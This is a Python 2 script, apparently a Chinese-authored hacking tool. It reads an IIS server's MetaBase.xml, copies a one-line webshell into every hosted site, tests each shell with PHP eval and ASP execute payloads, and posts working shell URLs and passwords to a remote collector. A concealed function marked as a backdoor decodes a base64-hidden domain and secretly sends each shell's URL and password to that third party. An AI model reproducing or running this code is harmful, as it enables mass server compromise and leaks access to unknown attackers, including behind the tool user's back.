#!/usr/local/bin/python
#-*- coding: UTF-8 -*-

import re
def open_file():
    try:
        #C:\WINDOWS\system32\inetsrv\MetaBase.xml
        fname="C:\WINDOWS\system32\inetsrv\MetaBase.xml"
        xxx = file(fname, 'r')
        return xxx.read()
    except BaseException, e:
        print "IIS INI Not found"
        #print(str(e))
        return 0

import urllib2
def Aurl_post(URL):   #提交数据
    try:
        req = urllib2.Request(URL)
        req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
        s = urllib2.urlopen(req,timeout=20)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
        #ss = s.read()
    except Exception,e:
        print e
        return 0
import base64
def http_url_hm(url,PASS): #后门
    try:
    #s1 = base64.encodestring('www.999kankan.com')  #加密
        s2 = base64.decodestring("d3d3Ljk5OWthbmthbi5jb20=") #解密
        SSurl="http://%s/URL_EXP.php?"\
              "yijuhua=1&url=%s&exp=exp&expR=webshell&webshell=%s&password=%s&bz=yijuhuaGL"\
              %(s2,url,url,PASS)
        Aurl_post(SSurl)
        return 1
    except Exception,e:
        print e
        return 0

def IIS_xml1():
    global argv1 #导入参数1 一句话文件
    #global argv2 #导入参数2 一句话密码
    global argv3 #导入参数3 提交后台地址
    global list_file    #文件路径
    global list_url    #URL地址
    try:
        data=open_file()
        if data==0:
            print u"Cannot find the file path in the C IIsWebServerfile"  #无法找到IIS配置文件
            return 0
        p2 = re.compile(r'<IIsWebVirtualDir.+?Path="(.+?)"')  #网站路径  LogFileDirectory="D:\nwwwroot\jisiw\logfiles"
        p3 = re.compile(r'<IIsWebServer.+?ServerBindings="(.+?)"')#.+?:  #获取网址 ServerBindings=":80:jisi.pdwh.cn			:80:www.jisiw.cn"
        data2=data.replace("\n", ':')  #去除换行符好匹配
        ###########################################################
        IISWEB = p2.findall(data2)#网站路径
        for every1 in IISWEB:#网站路径
            #print "===%s==="%(every1)
            fileurl="%s\%s"%(every1,argv1)
            list_file.append(fileurl)  #文件路径
            #path_file(fileurl,argv1)  #写入文件 路径 文件
            time.sleep(0.1)
        IISWEB = p3.findall(data2)#获取网址
        for every2 in IISWEB:#获取网址
            #print "-%s-"%(every2)
            wwwlist=every2.split(":")
            for url in wwwlist:
                if len(url)>=4:
                    url2=str(url).strip().lstrip().rstrip('')
                    urlyjh="http://%s/%s"%(url2,argv1)  #一句话地址
                    list_url.append(urlyjh)  #URL地址
            time.sleep(0.1)
        ###########################################################
    except BaseException, e:
        print(str(e))
        return 0

def path_file(path,fname):  #写入文件 路径 文件
    try:
        xxx = file(fname, 'r')  #读取要写入的文件
        data=xxx.read()

        file_object = open(path, 'w+') #写入文件
        file_object.writelines("\n")
        file_object.writelines(data)
        file_object.close()
    except BaseException, e:
        print(str(e))
        return 0

def TXT_file(name,data):  #写入文本 中文
    try:
        #file_nem=time.strftime('%Y.%m.%d')   #file_nem+".txt"
        file_object = open(name,'a+')
        file_object.write(data) #成功
        file_object.writelines("\n")
        file_object.close()
    except Exception,e:
        print "Write TXT failed",e
        return 0
####################################################################
#一句话验证
def yijuhua_cs(asp_php,url,PASS): #ASP还是PHP  ,URL地址 ，密码
    try:
        #选择扫描方式
        if asp_php == "":
            asp_php = "php"
        if asp_php == "asp":
            params = "=execute(\"response.clear:response.write(\"\"jinlaile\"\"):response.end\")"
        elif asp_php == "php":
            #params = "=@eval($_POST[\"echo(\"jinlaile\");die();\"]);"
            params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygiamlubGFpbGUiKTtkaWUoKTs="
        else:
            params = "=Response.Clear();Response.Write(\"jinlaile\");"
            #构造HTTP头
        pattern = re.compile('http:*')
        match = pattern.search(url)
        if(match):
            ztarget = url.replace("http://","").split('/')[0]
            headers={"Host": ztarget,\
                     "User-Agent": "Mozilla/5.0",\
                     "Content-Type": "application/x-www-form-urlencoded",\
                     "Referer": "http://"+ztarget
            }
        else:
            #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
            return 0
            #测试  链接
        conn = httplib.HTTPConnection(ztarget)
        params = PASS+params
        try:
            conn.request(method="POST",url=url,body=params,headers=headers)
            response = conn.getresponse()
            if ('content-encoding', 'gzip') in response.getheaders():
                compressedstream = StringIO.StringIO(response.read())
                gzipper = gzip.GzipFile(fileobj=compressedstream)
                data = gzipper.read()
            else:
                data = response.read()
            if(data.find("jinlaile") >= 0):
                #print "!!!!----PASS FIND!!! -------------->"+PASS
                return 1
                #os._exit(1)
        except Exception,e:
            #print e
            return 0
    except Exception,e:
        #print e
        return 0
####################################################################
def open_list():  #读取数组
    global argv1 #导入参数1 一句话文件
    global argv2 #导入参数2 一句话密码
    global argv3 #导入参数3 提交后台地址
    global list_file    #文件路径
    global list_url    #URL地址
    try:
        for i in list_file:
            print "copy file:%s"%(i)
            path_file(i,argv1)  #写入文件 路径 文件
            time.sleep(0.3)
        for urlyjh in list_url:
            print "url:%s"%(urlyjh)
            ASP_PHP=""
            if (".asp" in urlyjh or ".ASP" in urlyjh or ".Asp" in urlyjh):
                ASP_PHP="asp"
            if (".php" in urlyjh or ".PHP" in urlyjh or ".Php" in urlyjh):
                ASP_PHP="php"
            urlpass="%s|%s"%(urlyjh,argv2)
            time.sleep(0.3)
            if yijuhua_cs(ASP_PHP,urlyjh,argv2): #ASP还是PHP  ,URL地址 ，密码
                print urlpass,"---ok"
                http_url_hm(urlyjh,argv2) #后门
                if argv3=="":  #判断是否发送到远程
                    TXT_file("webshellOK.txt",urlpass)  #写入文本 中文
                else:
                    print "POST %s"%(argv3)
                    url="%s?shell=%s"%(argv3,urlpass)
                    Aurl_post(url)
            else:
                print urlpass,"===no"
                TXT_file("webshellNO.txt",urlpass)  #写入文本 中文
    except Exception,e:
        #print e
        return 0

list_file=[]    #文件路径
list_url=[]    #URL地址
list_file2=[]    #文件路径  去重复
list_url2=[]    #URL地址  去重复
import re,httplib
import gzip,StringIO
import socket
socket.setdefaulttimeout(10)
import sys
import time
if __name__ == "__main__":
    global argv1 #导入参数1 一句话文件
    global argv2 #导入参数2 一句话密码
    global argv3 #导入参数3 提交后台地址
    argv1=""
    argv2=""
    argv3=""
    print "IIS WEB yijuhua"
    print "luo xue QQ:2602159946"
#    IIS_xml1()
#    path_file("c:/12345.php","cs.php")  #写入文件 路径 文件
    if len(sys.argv) < 3:
        print "maim.exe xxx.php passwod"
        print "maim.exe xxx.php passwod http://www.xxx.com/webshell.php"
        print "maim.exe xxx.asp passwod"
        print "maim.exe xxx.asp passwod http://www.xxx.com/webshell.php"
        time.sleep(10)
        sys.exit()
    try:
        if not sys.argv[1]=="":
            argv1=sys.argv[1]
        if not sys.argv[2]=="":
            argv2=sys.argv[2]
        if not sys.argv[3]=="":
            argv3=sys.argv[3]
    except Exception,e:
        #print e
        pass
    IIS_xml1()  #iis操作
    open_list()  #读取数组


